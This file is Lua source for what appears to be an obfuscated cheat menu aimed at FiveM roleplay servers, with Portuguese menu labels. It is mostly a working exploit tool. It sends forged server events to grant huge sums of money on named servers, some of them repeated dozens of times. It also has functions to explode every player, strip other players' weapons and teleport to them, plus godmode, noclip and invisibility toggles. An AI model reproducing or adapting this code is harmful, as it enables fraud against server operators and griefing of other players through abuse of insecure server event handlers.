end
function bind()
    local klikniete = vitolasRPMQCUeMEUCUss
    local napis = vitolasRPMQCUeMEUCUss
    local zbindowane = admgordolas
        while not zbindowane do
            vitolasRPMQCUeMEUCUtt(1)
            vitolasRPMQCUeMEUCUuu(0.5, 0.5, 0.25, 0.3, 30, 30, 30, 255)
            text_szpachlan_szmata("Aperte a tecla pra mudar a bind!",admgordolas,0.35,0,0.425,0.48)
            for k, v in pairs(keys) do
                if IsDisabledControlPressed(0, v) then
                    klikniete = v
                    napis = k
                end
            end
            if klikniete ~= vitolasRPMQCUeMEUCUss then
                zbindowane = vitolasRPMQCUeMEUCUzz
                return klikniete, napis
            end
        end
    end
function ColorPicker(R, aJ, aK)
    colorpicker = vitolasRPMQCUeMEUCUzz
    open = admgordolas
    local R = {
        HSV = {H = 0, S = 0, V = 0},
        RGB = {R = R, G = aJ, B = aK},
        Held = {Hue = admgordolas, Value = admgordolas},
        Opened = admgordolas,
        Turned = vitolasRPMQCUeMEUCUzz
    }
    while R.Turned do
        vitolasRPMQCUeMEUCUgg(0, 1, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 2, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 142, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 322, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 106, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 25, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 24, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 257, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 32, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 31, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 30, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 34, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 23, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 22, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 16, vitolasRPMQCUeMEUCUzz)
        vitolasRPMQCUeMEUCUgg(0, 17, vitolasRPMQCUeMEUCUzz)
        local a9, aa = GetScreenSize().x, GetScreenSize().y
        Rectangle(0, 0, a9, aa, 24, 24, 24, 200)
        local aL, aM = a9 / 2 - 100, aa / 2 - 100
        Rectangle(aL - 2, aM - 2, 204, 228, 18, 18, 18, 255)
        Rectangle(aL - 1, aM - 1, 202, 226, 42, 42, 42, 255)
        Rectangle(aL, aM, 200, 224, 24, 24, 24, 255)
        Rectangle(aL, aM, 200, 5, R.RGB.R, R.RGB.G, R.RGB.B, 255)
        Rectangle(aL - 2 + 5, aM - 2 + 196, 194, 26, 18, 18, 18, 255)
        Rectangle(aL - 1 + 5, aM - 1 + 196, 192, 24, 42, 42, 42, 255)
        Rectangle(aL + 5, aM + 196, 190, 22, 24, 24, 24, 255)
        local r, g, b, ab = hsvToRgb(R.HSV.H, R.HSV.S, R.HSV.V, 1)
        aE("R: " .. r .. " G: " .. g .. " B: " .. b .. "", 0.451, 0.59, 0.29, vitolasRPMQCUeMEUCUzz, 4, admgordolas)
        aE("Pressione ENTER Para Confirmar", 0.432, 0.626, 0.28, vitolasRPMQCUeMEUCUzz, 10, admgordolas)
        local r, g, b, ab = hsvToRgb(R.HSV.H, 1, 1, 1)
        Rectangle(aL + 10, aM + 10, 160, 180, r, g, b, 255)
        Gradient(aL + 10, aM + 10, 160, 180, vitolasRPMQCUeMEUCUzz, r, g, b, 255, 255, 255, 255, 0)
        Gradient(aL + 10, aM + 10, 160, 180, admgordolas, 255, 255, 255, 0, 0, 0, 0, 255)
        HSVGradient(aL + 20 + 160, aM + 10, 10, 180, admgordolas, 0, 1, 1, 1, 1, 1)
        local x, y = GetNuiCursorPosition()
        local a9, aa = GetScreenSize().x, GetScreenSize().y
        local aL, aM = a9 / 2 - 100, aa / 2 - 100
        if IsControlJustPressed(0, 18) then
            if x > aL + 20 and x < aL + 20 + 160 and y > aM + 10 and y < aM + 10 + 180 then
                R.Held.Value = vitolasRPMQCUeMEUCUzz
            end
            if x > aL + 20 + 160 and x < aL + 20 + 160 + 10 and y > aM + 10 and y < aM + 10 + 180 then
                R.Held.Hue = vitolasRPMQCUeMEUCUzz
            end
            if x < aL or x > aL + 200 or y < aM or y > aM + 200 then
                R.Opened = admgordolas
            end
        end

        if IsDisabledControlPressed(0, 69) then
            if R.Held.Value then
                local aN = x - aL - 10
                local aO = y - aM - 60
                R.HSV.S = admmeupau.clamp(aN / 180, 0, 1)
                R.HSV.V = admmeupau.clamp(1 - aO / 160, 0, 1)
            end
            if R.Held.Hue then
                local aP = y - aM + -19
                R.HSV.H = admmeupau.clamp(aP / 180, 0, 1)
            end
            local r, g, b, ab = hsvToRgb(R.HSV.H, R.HSV.S, R.HSV.V, 1)
            R.RGB.R, R.RGB.G, R.RGB.B = r, g, b
        else
            if R.Held.Value then
                R.Opened = admgordolas
            end
            R.Held.Value = admgordolas
            R.Held.Hue = admgordolas
        end
        vitolasRPMQCUeMEUCUuuerinio(Mouse(admgordolas).x - 2, Mouse(admgordolas).y - 7, 3, 13, 0, 0, 0, 255)
        vitolasRPMQCUeMEUCUuuerinio(Mouse(admgordolas).x - 7, Mouse(admgordolas).y - 2, 13, 3, 0, 0, 0, 255)
        vitolasRPMQCUeMEUCUuuerinio(Mouse(admgordolas).x - 1, Mouse(admgordolas).y - 6, 1, 11, 255, 255, 255, 255)
        vitolasRPMQCUeMEUCUuuerinio(Mouse(admgordolas).x - 6, Mouse(admgordolas).y - 1, 11, 1, 255, 255, 255, 255)
        if IsDisabledControlJustPressed(0, 191) then
            open = vitolasRPMQCUeMEUCUzz
            colorpicker = admgordolas
            R.Turned = admgordolas
            return R.RGB.R, R.RGB.G, R.RGB.B
        end
        vitolasRPMQCUeMEUCUtt(0)
    end
end


local function corzinhagay()

    h.ThisIsSliders[7].value, h.ThisIsSliders[8].value, h.ThisIsSliders[9].value = ColorPicker()
    SetVehicleCustomPrimaryColour(
        GetVehiclePedIsUsing(PlayerPedId(-1)),
        h.ThisIsSliders[7].value,
        h.ThisIsSliders[8].value,
        h.ThisIsSliders[9].value
    )
    SetVehicleCustomSecondaryColour(
        GetVehiclePedIsUsing(PlayerPedId(-1)),
        h.ThisIsSliders[7].value,
        h.ThisIsSliders[8].value,
        h.ThisIsSliders[9].value
    )
end

local includeself = vitolasRPMQCUeMEUCUzz

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end


local function a0(a1, W, a2)
    if a1 == "HATS" or a1 == "GLASSES" or a1 == "EARS" then
        if a1 == "HATS" then
            fam_DUHSGOSDIUGIHOSDG = 0
        elseif a1 == "GLASSES" then
            fam_DUHSGOSDIUGIHOSDG = 1
        elseif a1 == "EARS" then
            fam_DUHSGOSDIUGIHOSDG = 2
        end
        Citizen.InvokeNative(
            0x93376B65A266EB5F,
            Citizen.InvokeNative(0x43A66C31C68491C0, -1),
            fam_DUHSGOSDIUGIHOSDG,
            W - 1,
            a2,
            1
        )
    else
        if a1 == "FACE" then
            fam_DUHSGOSDIUGIHOSDG = 0
        elseif a1 == "MASK" then
            fam_DUHSGOSDIUGIHOSDG = 1
        elseif a1 == "HAIR" then
            fam_DUHSGOSDIUGIHOSDG = 2
        elseif a1 == "TORSO" then
            fam_DUHSGOSDIUGIHOSDG = 3
        elseif a1 == "LEGS" then
            fam_DUHSGOSDIUGIHOSDG = 4
        elseif a1 == "HANDS" then
            fam_DUHSGOSDIUGIHOSDG = 5
        elseif a1 == "SHOES" then
            fam_DUHSGOSDIUGIHOSDG = 6
        elseif a1 == "SPECIAL1" then
            fam_DUHSGOSDIUGIHOSDG = 7
        elseif a1 == "SPECIAL2" then
            fam_DUHSGOSDIUGIHOSDG = 8
        elseif a1 == "SPECIAL3" then
            fam_DUHSGOSDIUGIHOSDG = 9
        elseif a1 == "TEXTURE" then
            fam_DUHSGOSDIUGIHOSDG = 10
        elseif a1 == "TORSO2" then
            fam_DUHSGOSDIUGIHOSDG = 11
        end
        Citizen.InvokeNative(
            0x262B14F48D29DE80,
            Citizen.InvokeNative(0x43A66C31C68491C0, -1),
            fam_DUHSGOSDIUGIHOSDG,
            W,
            a2,
            0
        )
    end
end

local function _()
    Citizen.InvokeNative(0xCD8A7537A9B52F06, Citizen.InvokeNative(0x43A66C31C68491C0, -1))
    Citizen.InvokeNative(0x0E5173C163976E38, Citizen.InvokeNative(0x43A66C31C68491C0, -1))
    Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 1, 0, 0, 0)
    Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 5, 0, 0, 0)
    Citizen.InvokeNative(0x262B14F48D29DE80, Citizen.InvokeNative(0x43A66C31C68491C0, -1), 9, 0, 0, 0)
end

local function atela()
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer))

    SetEntityCoordsNoOffset(PlayerPedId(), coords, 0.0, 0.0, 0.0) 


end
function TSE(is_server,event,...)
    local args=msgpack.pack({...})
    if is_server then
        vitolasRPMQCUeMEUCUwwInternal(event,args,args:len())
    else
        TriggerEventInternal(event,args,args:len())
    end
end
local function ClonePed(target)
    local ped = GetPlayerPed(target)
    local me = PlayerPedId()

    hat = GetPedPropIndex(ped, 0)
    hat_texture = GetPedPropTextureIndex(ped, 0)

    glasses = GetPedPropIndex(ped, 1)
    glasses_texture = GetPedPropTextureIndex(ped, 1)

    ear = GetPedPropIndex(ped, 2)
    ear_texture = GetPedPropTextureIndex(ped, 2)

    watch = GetPedPropIndex(ped, 6)
    watch_texture = GetPedPropTextureIndex(ped, 6)

    wrist = GetPedPropIndex(ped, 7)
    wrist_texture = GetPedPropTextureIndex(ped, 7)

    head_drawable = GetPedDrawableVariation(ped, 0)
    head_palette = GetPedPaletteVariation(ped, 0)
    head_texture = GetPedTextureVariation(ped, 0)

    beard_drawable = GetPedDrawableVariation(ped, 1)
    beard_palette = GetPedPaletteVariation(ped, 1)
    beard_texture = GetPedTextureVariation(ped, 1)

    hair_drawable = GetPedDrawableVariation(ped, 2)
    hair_palette = GetPedPaletteVariation(ped, 2)
    hair_texture = GetPedTextureVariation(ped, 2)

    torso_drawable = GetPedDrawableVariation(ped, 3)
    torso_palette = GetPedPaletteVariation(ped, 3)
    torso_texture = GetPedTextureVariation(ped, 3)

    legs_drawable = GetPedDrawableVariation(ped, 4)
    legs_palette = GetPedPaletteVariation(ped, 4)
    legs_texture = GetPedTextureVariation(ped, 4)

    hands_drawable = GetPedDrawableVariation(ped, 5)
    hands_palette = GetPedPaletteVariation(ped, 5)
    hands_texture = GetPedTextureVariation(ped, 5)

    foot_drawable = GetPedDrawableVariation(ped, 6)
    foot_palette = GetPedPaletteVariation(ped, 6)
    foot_texture = GetPedTextureVariation(ped, 6)

    acc1_drawable = GetPedDrawableVariation(ped, 7)
    acc1_palette = GetPedPaletteVariation(ped, 7)
    acc1_texture = GetPedTextureVariation(ped, 7)

    acc2_drawable = GetPedDrawableVariation(ped, 8)
    acc2_palette = GetPedPaletteVariation(ped, 8)
    acc2_texture = GetPedTextureVariation(ped, 8)

    acc3_drawable = GetPedDrawableVariation(ped, 9)
    acc3_palette = GetPedPaletteVariation(ped, 9)
    acc3_texture = GetPedTextureVariation(ped, 9)

    mask_drawable = GetPedDrawableVariation(ped, 10)
    mask_palette = GetPedPaletteVariation(ped, 10)
    mask_texture = GetPedTextureVariation(ped, 10)

    aux_drawable = GetPedDrawableVariation(ped, 11)
    aux_palette = GetPedPaletteVariation(ped, 11)
    aux_texture = GetPedTextureVariation(ped, 11)

    SetPedPropIndex(me, 0, hat, hat_texture, 1)
    SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
    SetPedPropIndex(me, 2, ear, ear_texture, 1)
    SetPedPropIndex(me, 6, watch, watch_texture, 1)
    SetPedPropIndex(me, 7, wrist, wrist_texture, 1)

    SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
    SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
    SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
    SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
    SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
    SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
    SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
    SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
    SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
    SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
    SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
    SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
end

function admmeupau.round(first, second)
    return tonumber(string.format("%." .. (second or 0) .. "f", first))
end
function ApplyForce(entity, direction)
    ApplyForceToEntity(
        entity,
        3,
        direction,
        0,
        0,
        0,
        admgordolas,
        admgordolas,
        vitolasRPMQCUeMEUCUzz,
        vitolasRPMQCUeMEUCUzz,
        admgordolas,
        vitolasRPMQCUeMEUCUzz
    )
end
function respawnPed(id, cords, int)
    SetEntityCoordsNoOffset(id, cords.x, cords.y, cords.z, admgordolas, admgordolas, admgordolas, vitolasRPMQCUeMEUCUzz)
    NetworkResurrectLocalPlayer(cords.x, cords.y, cords.z, int, vitolasRPMQCUeMEUCUzz, admgordolas)
    SetPlayerInvincible(id, admgordolas)
    TSE(admgordolas, "playerSpawned", cords.x, cords.y, cords.z)
    ClearPedBloodDamage(id)
end
local function AddVectors(one, two)
    return vector3(one.x + two.x, one.y + two.y, one.z + two.z)
end
function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end
function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end
function round(num, numDecimalPlaces)
    local mult = 10 ^ (numDecimalPlaces or 0)
    return admmeupau.floor(num * mult + 0.5) / mult
end
function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 =
        AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    ApplyForce(entity, targetPos)
end
function nativeRevive()
local coords = GetEntityCoords(PlayerPedId())
        NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId()), vitolasRPMQCUeMEUCUzz, admgordolas)
        ClearPedBloodDamage(PlayerPedId())
        TriggerEvent('playerSpawned', coords.x, coords.y, coords.z)
        StopScreenEffect('DeathFailOut')
end

---------FUNCTIONS----------

function kontrols(Disable)
    vitolasRPMQCUeMEUCUgg(0, 1, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 2, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 142, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 322, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 106, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 25, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 24, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 257, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 23, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 16, vitolasRPMQCUeMEUCUzz)
    vitolasRPMQCUeMEUCUgg(0, 17, vitolasRPMQCUeMEUCUzz)

end

function LeftBar()

    if Menumanacokkk(" 🤠 ", " 🤠 ",vitolasRPMQCUeMEUCUzz,0.387,0.250) then
        tab = "Self"
    
    end

    if Menumanacokkk(" 🔫 ", " 🔫 ",vitolasRPMQCUeMEUCUzz,0.423,0.250) then
        tab = "Armas"

    end

    if Menumanacokkk(" 🚘 ", " 🚘 ",vitolasRPMQCUeMEUCUzz,0.471,0.250) then
        tab = "Veiculos"

    end

    if Menumanacokkk(" 👁‍🗨 ", " 👁‍🗨 ",vitolasRPMQCUeMEUCUzz,0.517,0.250) then
        tab = "Visu"

    end

    if Menumanacokkk(" 🌐 ", " 🌐 ",vitolasRPMQCUeMEUCUzz,0.555,0.250) then
        tab = "Misc"
    end



    if Menumanacokkk(" 💠 ", " 💠 ",vitolasRPMQCUeMEUCUzz,0.595,0.250) then
        tab = "Players"
    end

    if Menumanacokkk(" ⚙️ ", " ⚙️ ",vitolasRPMQCUeMEUCUzz,0.635,0.250) then
        tab = "Config"
    end



   


    DrawGeneralAndDrawSecond()

end
local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, admgordolas)
end

local function GiveMaxAmmo()
    local ped = GetPlayerPed()
    for i = 1, #allweapons do
        AddAmmoToPed(ped, vitolasRPMQCUeMEUCUff(allweapons[i]), 250)
    end
end


function tabs() 
    if tab == "Self" then
        vitolasRPMQCUeMEUCUuu(0.387,0.275,0.023,0.0015,255, 255, 255,255)
        --0.387
        --0.257        
        


        if manacokkk("Reviver",admgordolas,0.387,0.35) then
            ReviverRP()
        end
        


        if manacokkk("Suicidio",admgordolas,0.387,0.4) then
            SuicidioRP()
        end
        
        if manacokkk("Diminuir Pena",admgordolas,0.387,0.69) then
            TriggerServerEvent("diminuirpena2121")
        end

        if manacokkk("DiminuirPena SantaGroup",admgordolas,0.387,0.73) then
            TriggerServerEvent("diminuirpenasantagroup")
        end

        if manacokkk("+Vida",admgordolas,0.5,0.35) then
            maisVidaRP()
        end 

        if manacokkk("~r~Desinjetar",admgordolas,0.615,0.35) then
            asd.toggleHandcuff()
        end

        if manacokkk("TP Way",admgordolas,0.501,0.4) then
            TeleportToWaypoint()
        end
        
        if manacokkk("Roupa Aleatória",admgordolas,0.501,0.45) then
            RamdomRoupaRP()
        end

        if manacokkk("FPS ON",admgordolas,0.615,0.40) then
            FPS_ON()
        end  
           
         if manacokkk("FPS OFF",admgordolas,0.615,0.45) then
            FPS_OFF()
        end

        vitolasRPMQCUeMEUCUyy("    ~b~» ~w~Dinheiro - Citys:",0.500,0.48,vitolasRPMQCUeMEUCUzz,0.3,10,admgordolas)
        if manacokkk("Athenas RP",admgordolas,0.501,0.53) then

            TriggerServerEvent('vrp_roubos:tunnel_req', "giveItem", {"money", 1000000000}, "vrp_roubos", 0)

        end

        if manacokkk("Paris RP",admgordolas,0.501,0.57) then

            TriggerServerEvent("minharolafasfsa")

        end

        if manacokkk("Wild RP",admgordolas,0.501,0.61) then

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')
            TriggerServerEvent('salario:pagamento2')

        end

        if manacokkk("Brazuca City",admgordolas,0.501,0.65) then

            emP.checkPayment(500)

        end

        if manacokkk("South RP",admgordolas,0.501,0.69) then

            TriggerServerEvent("reanimar:pagamento")

        end

        if manacokkk("Ilha RP",admgordolas,0.501,0.73) then

            TriggerServerEvent("reanimarporraviado:pagamento222")

        end

        if manacokkk("Lotus RP",admgordolas,0.615,0.53) then

            TriggerServerEvent('vrp_roubos:tunnel_req', "giveItem", {"money", 100000000}, "vrp_roubos", 0)

        end

        if manacokkk("Filadelfia City",admgordolas,0.615,0.57) then

            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")

            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")

            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")

            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")

            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")
            TriggerServerEvent("reanimar:pagamento1")

        end

        if manacokkk("Noxx Exclusive",admgordolas,0.615,0.61) then

            TriggerServerEvent('emp_motorista:tunnel_req','KoAJSOmlaksniudGBAEDGIbAKD',{false,1000000},"emp_motorista",0)

        end

        if manacokkk("Kush RP",admgordolas,0.615,0.65) then

            TriggerServerEvent("lzn_motoristak6iNdIFWkvQXSDIvv5","checkPayment",{1000000000,0},"kush_motorista",0)

        end

        if manacokkk("City11",admgordolas,0.615,0.69) then

            

        end

        if manacokkk("City12",admgordolas,0.615,0.73) then

            

        end

        if boxzinha("Noclip",0.347,0.45,0.45,Nocrip) then
            Nocrip = not Nocrip
            if Nocrip then
                SetEntityVisible(PlayerPedId(), admgordolas, admgordolas)
            else
                SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
                SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), vitolasRPMQCUeMEUCUzz, admgordolas)
                SetEntityVisible(PlayerPedId(), vitolasRPMQCUeMEUCUzz, admgordolas)
            end
        end

        if boxzinha("Stamina Infinita",0.347,0.47,0.47,stamina) then
            
            stamina = not stamina

        end

        if boxzinha("Invisivel",0.347,0.49,0.49,Invv2) then
            
            Invv2 = not Invv2
            if Invv2 then
                SetEntityVisible(PlayerPedId(), admgordolas, admgordolas)
            else
                SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
                SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), vitolasRPMQCUeMEUCUzz, admgordolas)
                SetEntityVisible(PlayerPedId(), vitolasRPMQCUeMEUCUzz, admgordolas)
            end

        end

        if boxzinha("Godmod",0.347,0.51,0.51,Godmode) then

            Godmode = not Godmode

        end

        if boxzinha("Super Pulo",0.347,0.53,0.53,SuperJumpRP) then

            SuperJumpRP = not SuperJumpRP

        end

        if boxzinha("Ficar Pequeno",0.347,0.55,0.55,BecomeTiny) then

            BecomeTiny = not BecomeTiny

        end

        if boxzinha("Soltar Fogo pela Boca",0.347,0.57,0.57,FireBreath) then

            FireBreath = not FireBreath

        end

        if boxzinha("Correr Rapido",0.347,0.59,0.59,correrSpeed) then

            correrSpeed = not correrSpeed

        end

        if boxzinha("Visão Térmica",0.347,0.61,0.61,visaotermicarp) then

            therm = not therm
            visaotermicarp = therm
            SetSeethrough(therm)

        end

        if boxzinha("FreeCam ~y~(Manutenção)",0.347,0.65,0.65,sdfijsdfjidfsjinm) then

            sdfijsdfjidfsjinm = not sdfijsdfjidfsjinm
            
        end

        if boxzinha("VitorMagneto",0.347,0.63,0.63,ForceTog) then
            
            ForceTog = not ForceTog

            if ForceTog then
                Citizen.CreateThread(function()
                ShowInfo("VitorMagneto ~g~[ON] ~g~\n~w~Ativa Apertando -» ~p~[E] ")
                local ForceKey = keys["E"]
                local Force = 4.0
                local KeyPressed = admgordolas
                local KeyTimer = 0
                local KeyDelay = 20
                local ForceEnabled = admgordolas
                local StartPush = admgordolas
                function forcetick()
                if (KeyPressed) then
                KeyTimer = KeyTimer + 1
                if (KeyTimer >= KeyDelay) then
                KeyTimer = 0
                KeyPressed = admgordolas
                end
                end
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                KeyPressed = vitolasRPMQCUeMEUCUzz
                ForceEnabled = vitolasRPMQCUeMEUCUzz
                end
                
                if (StartPush) then
                
                StartPush = admgordolas
                local pid = PlayerPedId()
                local CamRot = GetGameplayCamRot(2)
                
                local force = 5
                
                local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                local Fz = force * (CamRot.x * 0.2)
                
                local PlayerVeh = GetVehiclePedIsIn(pid, admgordolas)
                
                for k in EnumerateVehicles() do
                SetEntityInvincible(k, sdjfjgdfghfdjksa)
                if IsEntityOnScreen(k) and k ~= PlayerVeh then
                ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, vitolasRPMQCUeMEUCUzz, admgordolas, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
                end
                end
                
                for k in EnumeratePeds() do
                if IsEntityOnScreen(k) and k ~= pid then
                ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, vitolasRPMQCUeMEUCUzz, admgordolas, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz, vitolasRPMQCUeMEUCUzz)
                end
                end
                
                end
                
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                KeyPressed = vitolasRPMQCUeMEUCUzz
                StartPush = vitolasRPMQCUeMEUCUzz
                ForceEnabled = admgordolas
                end
                
                if (ForceEnabled) then
                local pid = PlayerPedId()
                local PlayerVeh = GetVehiclePedIsIn(pid, admgordolas)
                
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                
